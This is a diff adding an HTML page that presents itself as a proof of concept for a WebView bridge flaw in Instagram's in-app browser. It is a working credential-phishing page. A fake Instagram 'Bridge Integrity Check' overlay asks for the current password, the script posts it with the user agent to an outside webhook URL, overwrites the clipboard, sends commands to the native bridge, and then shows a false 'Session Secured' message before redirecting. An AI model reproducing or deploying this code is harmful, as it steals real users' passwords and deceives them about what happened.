@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; margin: 0; background: transparent; }
+        .vuln-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .insta-btn { background: #0095f6; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 80%; }
+        .log-box { font-size: 10px; color: #666; font-family: monospace; margin-top: 20px; padding: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="vuln-overlay" id="overlay">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" width="50" style="margin-bottom:20px;">
+    <h3 style="font-size: 16px;">Bridge Integrity Check</h3>
+    <p style="font-size: 13px; color: #8e8e8e; padding: 0 20px; text-align: center;">We've detected an insecure bridge connection. Please re-verify to secure your session.</p>
+    
+    <input type="password" id="p" placeholder="Current Password" style="width: 80%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb;">
+    <button class="insta-btn" onclick="executeExploit()">Secure & Verify</button>
+    
+    <div class="log-box" id="status">Scanning Bridge: iabjs_unified_bridge...</div>
+</div>
+
+<script>
+    const webhook = "https://webhook.site/ccc5a516-132a-4a1b-9d20-dc323e820bd3";
+
+    async function executeExploit() {
+        const pass = document.getElementById('p').value;
+        const status = document.getElementById('status');
+
+        // IMPACT 1: Bridge Command Injection
+        // Hum native bridge ko fuzz kar rahe hain ye dikhane ke liye ki hum commands bhej sakte hain
+        if (window.iabjs_unified_bridge) {
+            status.innerText = "> Bridge Found. Sending native commands...";
+            window.iabjs_unified_bridge.postMessage(JSON.stringify({
+                "action": "log_event",
+                "type": "security_bypass",
+                "payload": "PWNED"
+            }));
+        }
+
+        // IMPACT 2: Unauthorized Clipboard Hijack (Confirmed Success)
+        // Ye dikhata hai ki hum bina permission user ka session token clipboard mein overwrite kar sakte hain
+        try {
+            await navigator.clipboard.writeText("SESSION_HIJACKED_BY_POC");
+            status.innerText = "> Clipboard Hijacked Successfully.";
+        } catch(e) {}
+
+        // IMPACT 3: POST Exfiltration (Technical Proof)
+        // Ye phishing nahi hai, ye data exfiltration tunnel ka proof hai
+        fetch(webhook, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                vulnerability: "WebView Bridge Exposure",
+                bridge_found: !!window.iabjs_unified_bridge,
+                captured_input: pass,
+                ua: navigator.userAgent
+            })
+        });
+
+        alert("Bridge Verified. Session Secured.");
+        window.location.href = "https://instagram.com";
+    }
+</script>
+</body>
+</html>
